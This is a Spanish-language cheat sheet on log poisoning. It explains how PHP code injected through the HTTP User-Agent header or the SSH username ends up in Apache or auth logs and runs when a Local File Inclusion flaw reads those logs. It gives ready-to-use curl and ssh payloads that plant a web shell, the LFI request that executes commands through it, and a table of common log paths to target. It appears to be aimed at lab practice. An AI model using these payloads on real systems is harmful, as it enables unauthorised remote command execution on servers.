---

### 📝 **Log Poisoning Cheat Sheet**

---

#### 🚩 **¿Qué es el Log Poisoning?**
El **Log Poisoning** es una técnica de ataque en la que un atacante **manipula los archivos de registro (logs)** de una aplicación web o servicio para lograr un resultado malicioso.  
Se suele utilizar en combinación con vulnerabilidades de **LFI (Local File Inclusion)** para lograr una **Ejecución Remota de Comandos (RCE)**.  

---

### 💣 **Tipos de Log Poisoning**

#### 🔐 **1. SSH Log Poisoning**
- El atacante inyecta código PHP en el **campo de usuario** durante el proceso de autenticación SSH.
- El código malicioso queda registrado en el archivo **`auth.log`** o **`btmp`**.
- Se ejecuta cuando el archivo de registro es leído desde el servidor.

#### 🌐 **2. Apache Log Poisoning**
- El atacante inyecta código PHP en el **campo User-Agent** de una solicitud HTTP.
- El código se almacena en el archivo **`access.log`** de Apache.
- La ejecución se produce cuando el archivo de log es leído a través de una vulnerabilidad LFI.

---

### 🚩 **Archivos de Logs Comunes**
| Sistema Operativo | Archivo de Log                   | Descripción            |
| ---------------- | -------------------------------- | ----------------------- |
| Debian/Ubuntu     | `/var/log/apache2/access.log`      | Logs de Apache          |
| Debian/Ubuntu     | `/var/log/auth.log`                | Logs de autenticación SSH|
| Red Hat/CentOS    | `/var/log/httpd/access.log`        | Logs de Apache          |
| Red Hat/CentOS    | `/var/log/btmp`                    | Logs de autenticación SSH|

---

### ⚠️ **IMPORTANTE**
- **Precaución al escribir comandos:**  
  Si los comandos están mal formateados o las comillas están incorrectas, se puede **contaminar el log** y hacer que el código malicioso no sea interpretado.  

---

### 💉 **Payloads Comunes**

#### 🐚 **1. Inyección de código PHP en Apache (User-Agent)**
```bash
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system('whoami'); ?>"
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

---

#### 🔑 **2. Inyección de código PHP en SSH (Nombre de usuario)**
```bash
ssh '<?php system($_GET["cmd"]); ?>'@172.17.0.2
```

---

### 🚀 **Ejecutando el Código Malicioso**
Una vez inyectado el payload, realiza la llamada a través de la vulnerabilidad LFI:  
```bash
localhost/?filename=/var/log/apache2/access.log&cmd=id
```
- Aquí el archivo de log (`access.log`) es leído por la aplicación, lo que desencadena la ejecución del código PHP.

---

💡 **Consejo:**  
Si el log queda contaminado, se recomienda borrar el archivo y reiniciar el servicio para restaurar la integridad del sistema.  

---
